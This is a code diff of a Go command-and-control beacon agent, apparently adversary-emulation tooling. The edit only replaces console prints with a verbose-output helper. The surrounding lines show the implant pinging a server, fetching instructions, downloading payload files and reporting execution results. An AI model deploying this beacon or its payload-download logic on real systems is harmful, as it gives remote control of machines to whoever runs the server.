@@ -13,6 +13,7 @@ import (
 
 	"../execute"
 	"../util"
+	"../output"
 )
 
 const (
@@ -27,10 +28,10 @@ func (contact API) Ping(server string) bool {
 	address := fmt.Sprintf("%s/sand/ping", server)
 	bites := request(address, nil)
 	if(string(bites) == "pong") {
-		fmt.Println("[+] Ping success")
+		output.VerbosePrint("[+] Ping success")
 		return true;
 	}
-	fmt.Println("[+] Ping failure")
+	output.VerbosePrint("[+] Ping failure")
 	return false;
 }
 
@@ -41,14 +42,14 @@ func (contact API) GetInstructions(profile map[string]interface{}) map[string]in
 	bites := request(address, data)
 	var out map[string]interface{}
 	if bites != nil {
-		fmt.Println("[+] beacon: ALIVE")
+		output.VerbosePrint("[+] beacon: ALIVE")
 		var commands interface{}
 		json.Unmarshal(bites, &out)
 		json.Unmarshal([]byte(out["instructions"].(string)), &commands)
 		out["sleep"] = int(out["sleep"].(float64))
 		out["instructions"] = commands
 	} else {
-		fmt.Println("[-] beacon: DEAD")
+		output.VerbosePrint("[-] beacon: DEAD")
 	}
 	return out
 }
@@ -74,7 +75,7 @@ func (contact API) RunInstruction(command map[string]interface{}, profile map[st
 func drop(server string, payload string) string {
 	location := filepath.Join(payload)
 	if len(payload) > 0 && util.Exists(location) == false {
-		fmt.Println(fmt.Sprintf("[*] Downloading new payload: %s", payload))
+		output.VerbosePrint(fmt.Sprintf("[*] Downloading new payload: %s", payload))
 		address := fmt.Sprintf("%s/file/download", server)
 		req, _ := http.NewRequest("POST", address, nil)
 		req.Header.Set("file", payload)
@@ -94,7 +95,7 @@ func sendExecutionResults(commandID interface{}, server interface{}, result []by
 	data, _ := json.Marshal(map[string]string{"link_id": link, "output": string(util.Encode(result)), "status": status})
 	request(address, data)
 	if cmd == "die" {
-		fmt.Println("[+] Shutting down...")
+		output.VerbosePrint("[+] Shutting down...")
 		util.StopProcess(os.Getpid())
 	}
 }
